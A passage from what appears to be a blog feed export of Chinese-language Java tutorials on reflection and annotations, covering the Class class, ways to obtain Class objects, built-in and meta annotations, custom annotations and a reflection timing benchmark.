i++) &#123;<br>            getName.invoke(dog,<span class="hljs-keyword">null</span>);<br>        &#125;<br>        <span class="hljs-keyword">long</span> endTime=System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;反射方法（关闭检测）执行10^8的时间&quot;</span>+(endTime-startTime)+<span class="hljs-string">&quot;ms&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            test1();<br>            test2();<br>            test3();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            System.out.println(e);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>结果如下</p><blockquote><p>普通方法执行10^8的时间102ms<br>反射方法执行10^8的时间46183ms<br>反射方法（关闭检测）执行10^8的时间1293ms</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_注释与反射_2</title>
    <link href="/2021/04/07/Java/JavaBase/java_base_%E6%B3%A8%E9%87%8A%E4%B8%8E%E5%8F%8D%E5%B0%84_2/"/>
    <url>/2021/04/07/Java/JavaBase/java_base_%E6%B3%A8%E9%87%8A%E4%B8%8E%E5%8F%8D%E5%B0%84_2/</url>
    
    <content type="html"><![CDATA[<h1 id="注释与反射-——-2"><a href="#注释与反射-——-2" class="headerlink" title="注释与反射 —— 2"></a>注释与反射 —— 2</h1><h2 id="静态VS-动态语言"><a href="#静态VS-动态语言" class="headerlink" title="静态VS 动态语言"></a>静态VS 动态语言</h2><p><strong>动态语言</strong></p><ul><li>是一类在运行时可以改变其结构的语言:例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</li><li>主要动态语言:Object-C、C#、JavaScript、PHP、Python等。</li></ul><p><strong>静态语言</strong></p><ul><li>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。</li><li>Java不是动态语言，但Java可以称之为“准动态语言”。即Java有一定的动态性，我们可以利用反射机制获得类似动态语言的特性。Java的动态性让编程的时候更加灵活!</li></ul><h2 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h2><ul><li><p>Reflection(反射）是Java被视为动态语言的关键，反射机制允许程序在执行期借助于Reflection APl取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。<br><em>Class c= Class.forName(“java.lang.String”)</em></p></li><li><p>加载完类之后，在堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个Class对象)，这个对象就包含了完整的类的结构信息。我们可以通过这个对象看到类的结构。这个对象就像一面镜子，透过这个镜子看到类的结构，所以，我们形象的称之为:反射</p><p><em>正常方式:引入需要的”包类”名称–&gt;通过new实例化–&gt;取得实例化对象</em></p><p><em>反射方式:实例化对象–&gt;getClass()方法—&gt;得到完整的“包类”名称</em></p></li></ul><h2 id="优点和缺点"><a href="#优点和缺点" class="headerlink" title="优点和缺点"></a>优点和缺点</h2><p><strong>优点</strong></p><ul><li>可以实现动态创建对象和编译，体现出很大的灵活性。</li></ul><p><strong>缺点</strong></p><ul><li>对性能有影响。使用反射基本上是一种解释操作，我们可以告诉JVM，我们希望做什么并且它满足我们的要求。这类操作总是慢于直接执行相同的操作。</li></ul><h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>在Object类中定义了以下的方法，此方法将被所有子类继承</p><p><em>public final Class getClass()</em></p><ul><li>以上的方法返回值的类型是一个Class类，此类是Java反射的源头，实际上所谓反射从程序的运行结果来看也很好理解，即:可以通过对象反射求出类的名称。</li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//什么叫反射</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reflection</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">//通过反射获取类的class对象</span><br>        Class c1 = Class.forName(<span class="hljs-string">&quot;ll.注解与反射.User&quot;</span>);<br>        Class c2 = Class.forName(<span class="hljs-string">&quot;ll.注解与反射.User&quot;</span>);<br>        System.out.println(c1);<br><br>        <span class="hljs-comment">//一个类在内存中只有一个Class对象</span><br>        <span class="hljs-comment">//一个类被加载后，类的整个结构都会被封装在class对象中</span><br>        System.out.println(c1.hashCode());<br>        System.out.println(c2.hashCode());<br>    &#125;<br>&#125;<br><span class="hljs-comment">//实体类:pojo , entity</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> id, <span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.id = id;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="Class类-1"><a href="#Class类-1" class="headerlink" title="Class类"></a>Class类</h2><p>对象照镜子后可以得到的信息:某个类的属性、方法和构造器、某个类到底实现了哪些接口对于每个类而言，JRE都为其保留一个不变的Class类型的对象。一个Class对象包含了特定某个结构(class/interface/enum/annotation/primitive type/void/[])的有关信息。</p><ul><li>Class本身也是一个类</li><li>Class对象只能由系统建立对象</li><li>一个加载的类在JVM中只会有一个Class实例</li><li>一个Class对象对应的是一个加载到JVM中的一个.class文件</li><li>每个类的实例都会记得自己是由哪个Class 实例所生成</li><li>通过Class可以完整地得到一个类中的所有被加载的结构</li><li>Class类是Reflection的根源，针对任何你想动态加载、运行的类，唯有先获得相应的Class对象</li></ul><h2 id="Class类的常用方法"><a href="#Class类的常用方法" class="headerlink" title="Class类的常用方法"></a>Class类的常用方法</h2><table><thead><tr><th>方法名</th><th>功能说明</th></tr></thead><tbody><tr><td>static ClassforName(String name)</td><td>返回指定类名name的Class对象</td></tr><tr><td>Object newlnstance()</td><td>调用缺省构造函数，返回Class对象的一个实例</td></tr><tr><td>getName()</td><td>返回此Class对象所表示的实体(类，接口，数组类或void)的名称。</td></tr><tr><td>Class getSuperClass()</td><td>返回当前Class对象的父类的Class对象</td></tr><tr><td>Class[] getinterfaces()</td><td>获取当前Class对象的接口</td></tr><tr><td>ClassLoader getClassLoader()</td><td>返回该类的类加载器</td></tr><tr><td>Constructor[ getConstructors()</td><td>返回一个包含某些Constructor对象的数组</td></tr><tr><td>Method getMothed(String name,Class.. T)</td><td>返回一个Method对象，此对象的形参类型为paramType</td></tr><tr><td>Field[] getDeclaredFields()</td><td>返回Field对象的一个数组</td></tr></tbody></table><h2 id="获取Class类的实例"><a href="#获取Class类的实例" class="headerlink" title="获取Class类的实例"></a>获取Class类的实例</h2><p> a) 若已知具体的类，通过类的class属性获取，该方法最为安全可靠，程序性能最高。</p><p><em>Class clazz = Person.class;</em></p><p>b)已知某个类的实例，调用该实例的getClass()方法获取Class对象</p><p><em>Class clazz= person.getClass();</em></p><p>c)已知一个类的全类名，且该类在类路径下，可通过Class类的静态方法forName()获取，可能抛出ClassNotFoundException</p><p><em>Class clazz= Class.forName(“demo01.Student”);</em></p><p>d)内置基本数据类型可以直接用类名.Type</p><p>e)还可以利用ClassLoader我们之后讲解</p><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试Class类的创建方式有哪些</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br>        Person person=<span class="hljs-keyword">new</span> Student();<br>        System.out.println(<span class="hljs-string">&quot;这个人是：&quot;</span>+person.name);<br><br>        <span class="hljs-comment">//方式一：通过对象获得</span><br>        Class c1=person.getClass();<br>        System.out.println(c1.hashCode());<br>        <span class="hljs-comment">//方式二：forname获得</span><br>        Class c2=Class.forName(<span class="hljs-string">&quot;ll.注解与反射.Student&quot;</span>);<br>        System.out.println(c2.hashCode());<br><br>        <span class="hljs-comment">//方式三：通过类名.class获得</span><br>        Class c3=Student.class;<br>        System.out.println(c3.hashCode());<br><br>        <span class="hljs-comment">//方法四：基本内置类型的包装类都有一个Type属性</span><br>        Class c4=Integer.TYPE;<br>        System.out.println(c4);<br><br>        <span class="hljs-comment">//获得父类类型</span><br>        Class c5=c1.getSuperclass();<br>        System.out.println(c5);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Student</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name=<span class="hljs-string">&quot;学生&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Teacher</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name=<span class="hljs-string">&quot;老师&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="哪些类型可以有Class对象"><a href="#哪些类型可以有Class对象" class="headerlink" title="哪些类型可以有Class对象"></a>哪些类型可以有Class对象</h2><ul><li>class:外部类，成员(成员内部类，静态内部类)，局部内部类,匿名内部类。</li><li>interface:接口</li><li>[]∶数组</li><li>enum:枚举</li><li>annotation:注解@interface</li><li>primitive type:基本数据类型</li><li>void</li></ul><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.annotation.ElementType;<br><br><span class="hljs-comment">//所有类型的Class</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Class c1=Object.class;<span class="hljs-comment">//类</span><br>        Class c2=Comparable.class;<span class="hljs-comment">//接口</span><br>        Class c3=String[].class;<span class="hljs-comment">//一维数组</span><br>        Class c4=<span class="hljs-keyword">int</span>[][].class;<span class="hljs-comment">//二维数组</span><br>        Class c5=Override.class;<span class="hljs-comment">//注解</span><br>        Class c6= ElementType.class;<span class="hljs-comment">//枚举</span><br>        Class c7=Integer.class;<span class="hljs-comment">//基本数据类型</span><br>        Class c8=<span class="hljs-keyword">void</span>.class;<span class="hljs-comment">//void</span><br>        Class c9=Class.class;<span class="hljs-comment">//Class</span><br><br>        System.out.println(c1);<br>        System.out.println(c2);<br>        System.out.println(c3);<br>        System.out.println(c4);<br>        System.out.println(c5);<br>        System.out.println(c6);<br>        System.out.println(c7);<br>        System.out.println(c8);<br>        System.out.println(c9);<br>        <span class="hljs-comment">//只要元素类型与维度一样就是同一个Class</span><br>        <span class="hljs-keyword">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">int</span>[] b=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">100</span>];<br>        System.out.println(a.getClass()+<span class="hljs-string">&quot;:&quot;</span>+b.getClass());<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_注释与反射_1</title>
    <link href="/2021/04/07/Java/JavaBase/java_base_%E6%B3%A8%E9%87%8A%E4%B8%8E%E5%8F%8D%E5%B0%84_1/"/>
    <url>/2021/04/07/Java/JavaBase/java_base_%E6%B3%A8%E9%87%8A%E4%B8%8E%E5%8F%8D%E5%B0%84_1/</url>
    
    <content type="html"><![CDATA[<h1 id="注释与反射——-1"><a href="#注释与反射——-1" class="headerlink" title="注释与反射—— 1"></a>注释与反射—— 1</h1><h2 id="什么是注解"><a href="#什么是注解" class="headerlink" title="什么是注解"></a>什么是注解</h2><ul><li><p>Annotation是从JDK5.0开始引入的新技术．</p></li><li><p>Annotation的作用:</p><ul><li><p>不是程序本身，可以对程序作出解释.(这一点和注释(comment)没什么区别)</p></li><li><p>可以被其他程序(比如:编译器等)读取.</p></li></ul></li><li><p>Annotation的格式:</p><ul><li>注解是以”@注释名”在代码中存在的,还可以添加一些参数值,例如:@SuppressWarnings(value=”unchecked”).</li></ul></li><li><p>Annotation在哪里使用?</p><ul><li>可以附加在package , class , method , field等上面﹐相当于给他们添加了额外的辅助信息,我们可以通过反射机制编程实现对这些元数据的访问</li></ul></li></ul><h2 id="内置注释"><a href="#内置注释" class="headerlink" title="内置注释"></a>内置注释</h2><ul><li>＠Override:定义在java.lang.Override 中,此注释只适用于修辞方法﹐表示一个方法声明打算重写超类中的另一个方法声明.</li><li>@Deprecated :定义在java.lang.Deprecated中,此注释可以用于修辞方法﹐属性﹐类﹐表示不鼓励程序员使用这样的元素﹐通常是因为它很危险或者存在更好的选择.</li><li>@SuppressWarnings:定义在java.lang.SuppressWarnings中,用来抑制编译时的警告信息.</li><li>与前两个注释有所不同,你需要添加一个参数才能正确使用,这些参数都是已经定义好了的,我们选择性的使用就好了﹒</li><li>@SuppressWarnings(“all”)</li><li>@SuppressWarnings(“unchecked”)</li><li>@SuppressWarnings(value={“unchecked”,”deprecation”})</li><li>等等…….</li></ul><p>Test_1.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//什么是注解</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Object</span></span>&#123;<br>    <span class="hljs-comment">//重写的注解</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.toString();<br>    &#125;<br>    <span class="hljs-comment">//不推荐使用，但是可以使用，或者存在更好的方式</span><br>    <span class="hljs-meta">@Deprecated</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;不好&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//镇压警告</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br>        String i=<span class="hljs-string">&quot;jalfks&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        show();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h2><ul><li>元注解的作用就是负责注解其他注解，Java定义了4个标准的meta-annotation类型,他们被用来提供对其他annotation类型作说明．</li><li>这些类型和它们所支持的类在java.lang.annotation包中可以找到.(@Target , @Retention ,@Documented , @Inherited )<ul><li>@Target:用于描述注解的使用范围(即:被描述的注解可以用在什么地方)</li><li>@Retention :表示需要在什么级别保存该注释信息﹐用于描述注解的生命周期(SOURCE&lt; CLASS &lt; RUNTIME)</li><li>@Document:说明该注解将被包含在javadoc中</li><li>@lnherited:说明子类可以继承父类中的该注解</li></ul></li></ul><p>Test_2.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.annotation.*;<br><br><span class="hljs-comment">//测试元注解</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_2</span> </span>&#123;<br>    <span class="hljs-meta">@MyAnnotation</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//定义一个注解</span><br><span class="hljs-meta">@Target(value = &#123;ElementType.METHOD,ElementType.TYPE&#125;)</span><span class="hljs-comment">//表示可以放到什么地方</span><br><span class="hljs-comment">//表示我们的注解在什么地方还有效</span><br><span class="hljs-comment">//runtime&gt;class&gt;sources</span><br><span class="hljs-meta">@Retention(value = RetentionPolicy.RUNTIME)</span><br><span class="hljs-comment">//表示是否将我们的注解生成在JAVAdoc中</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-comment">//子类可以继承父类的注解</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-meta">@interface</span> MyAnnotation&#123;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h2><ul><li>使用@interface自定义注解时﹐自动继承了java.lang.annotation.Annotation接口</li><li>分析:<ul><li>interface用来声明一个注解﹐格式:public interface注解名{定义内容}</li><li>其中的每一个方法实际上是声明了一个配置参数.</li><li>方法的名称就是参数的名称.</li><li>返回值类型就是参数的类型(返回值只能是基本类型,Class , String , enum ).</li><li>可以通过default来声明参数的默认值</li><li>如果只有一个参数成员﹐一般参数名为value</li><li>注解元素必须要有值,我们定义注解元素时﹐经常使用空字符串,0作为默认值．</li></ul></li></ul><p>Test_3.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.annotation.*;<br><br><span class="hljs-comment">//自定义注解</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_3</span></span>&#123;<br>    <span class="hljs-comment">//注解可以显示赋值，如果没有默认值，我们就必须赋值</span><br>    <span class="hljs-meta">@MyAnnotation2(name = &quot;ll&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>&#125;<br><span class="hljs-meta">@Target(value = &#123;ElementType.TYPE,ElementType.METHOD&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@interface</span> MyAnnotation2&#123;<br>    <span class="hljs-comment">//注解的参数：参数类型+参数名（）</span><br>    <span class="hljs-function">String <span class="hljs-title">name</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span>  &quot;&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">age</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> 0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">id</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> -1</span>;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_UDP</title>
    <link href="/2021/04/07/Java/JavaBase/java_base_UDP/"/>
    <url>/2021/04/07/Java/JavaBase/java_base_UDP/</url>
    
